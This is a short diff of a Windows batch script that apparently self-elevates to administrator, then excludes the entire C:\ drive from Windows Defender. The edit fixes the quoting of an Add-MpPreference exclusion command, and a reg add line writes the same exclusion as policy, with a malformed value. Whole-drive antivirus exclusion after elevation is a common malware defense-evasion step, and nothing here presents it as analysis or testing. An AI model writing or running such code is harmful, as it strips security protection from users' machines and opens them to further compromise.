@@ -5,7 +5,7 @@ if not "%1"=="am_admin" (
     exit /b
 )
 
-powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
+powershell.exe -command "Add-MpPreference -ExclusionPath C:\"
 
 powershell.exe reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\==
 
